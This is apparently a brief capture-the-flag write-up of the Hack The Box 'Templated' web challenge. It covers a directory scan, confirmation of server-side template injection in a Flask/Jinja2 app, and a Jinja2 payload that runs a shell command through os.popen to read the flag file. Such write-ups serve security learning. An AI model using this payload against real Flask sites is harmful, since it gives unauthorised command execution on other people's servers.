---
description: This is a web challenge from hackthebox.
---

# Templated \[EASY]

{% embed url="https://app.hackthebox.com/challenges/templated" %}
Link
{% endembed %}

## **ATTACK SUMMARY:**

> 1. Directed all the traffic through the bup proxy.
> 2. Backend server is werkzeug 1.0.1 and python 3.9.0.

```bash
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 79
Server: Werkzeug/1.0.1 Python/3.9.0
Date: Thu, 19 Jan 2023 08:44:50 GMT
```

After visiting the site we got . "Site still under construction

Proudly powered by Flask/Jinja2"

#### Directory scan:

```bash
hax-13@ZARB:~/Documents/ctfs/htb/WEB/templated$ cat ffuf/ini-com-scn.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://161.35.169.118:32199/FUZZ
 :: Wordlist         : FUZZ: /opt/wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response lines: 3
________________________________________________


```

Nothing found during directory scan.

After some ticketing around found some interesting behavior when we try to access a nonexistent directory it's name is reflected back in the response and as name suggests.&#x20;

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>SSTI CONFIRMED</p></figcaption></figure>

Let's find a payload to read flag of the system.

`{{ self._TemplateReference__context.cycler.init.globals.os.popen('cat flag.txt').read() }}`

``

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection" %}

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
